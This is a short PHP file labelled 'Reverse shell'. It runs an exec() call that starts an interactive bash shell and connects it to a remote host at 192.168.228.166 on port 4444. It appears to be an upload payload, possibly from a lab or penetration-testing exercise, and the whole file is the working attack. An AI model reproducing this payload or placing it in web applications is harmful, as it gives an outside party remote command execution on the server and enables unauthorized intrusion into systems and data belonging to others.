<?php
// Reverse shell
// 192.168.228.130 -p 4444
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.228.166/4444 0>&1'");
?>